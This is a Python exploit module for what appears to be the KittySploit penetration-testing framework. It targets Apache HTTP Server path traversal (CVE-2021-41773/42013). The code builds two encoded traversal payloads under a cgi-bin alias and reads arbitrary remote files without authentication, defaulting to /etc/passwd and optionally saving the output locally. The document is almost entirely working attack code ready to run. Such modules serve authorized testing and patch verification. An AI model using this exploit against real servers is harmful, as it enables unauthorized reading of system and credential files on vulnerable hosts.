#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache HTTP Server path-traversal arbitrary file read (CVE-2021-41773 / CVE-2021-42013)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'Apache HTTP Server - Path Traversal File Read (CVE-2021-41773/42013)',
        'description': (
            'Reads arbitrary files via CVE-2021-41773 / CVE-2021-42013 encoded path '
            'traversal under cgi-bin/icons aliases.'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2021-41773', 'CVE-2021-42013'],
        'platform': Platform.LINUX,
        'references': [
            'https://httpd.apache.org/security/vulnerabilities_24.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-41773',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-42013',
        ],
        'tags': ['apache', 'httpd', 'lfi', 'file-read', 'unauth', 'kev', 'cve-2021-41773'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.2,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'scanner/http/cve_2021_41773_detect',
                    'scanner/http/cve_2021_42013_detect',
                ],
            },
        },
    }

    file_read = OptString('/etc/passwd', 'Absolute remote file path to read', required=True)
    cgi_prefix = OptString('/cgi-bin', 'Mapped Alias/ScriptAlias prefix', required=False)
    encoding = OptString('41773', 'Traversal encoding: 41773 or 42013', required=False)
    output_file = OptString('', 'Local file to write retrieved content', required=False)
    output_limit = OptInteger(12000, 'Max chars to print when output_file empty (0=full)', required=False, advanced=True)

    def _read_with(self, remote: str, enc: str) -> str:
        prefix = str(self.cgi_prefix or '/cgi-bin').rstrip('/')
        if enc == '42013':
            trav = '/' + ('.%%32%65/' * 9)
        else:
            trav = '/.%2e/' + ('%2e%2e/' * 7)
        path = f'{prefix}{trav}{remote}'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return ''
        return r.text or ''

    def execute(self, file_path: str) -> str:
        remote = str(file_path or '').strip().lstrip('/')
        if not remote:
            return ''
        preferred = str(self.encoding or '41773').strip()
        body = self._read_with(remote, preferred)
        if body:
            return body
        alt = '42013' if preferred != '42013' else '41773'
        return self._read_with(remote, alt)

    def run(self):
        target = str(self.file_read or '/etc/passwd')
        print_status(f'Reading {target} via Apache path traversal ...')
        body = self.execute(target)
        if not body:
            print_error('Empty response')
            return False
        out = str(self.output_file or '').strip()
        if out:
            with open(out, 'w', encoding='utf-8', errors='replace') as fh:
                fh.write(body)
            print_success(f'Wrote {len(body)} bytes to {out}')
        else:
            limit = int(self.output_limit or 0)
            print_info(body if limit <= 0 else body[:limit])
        return True
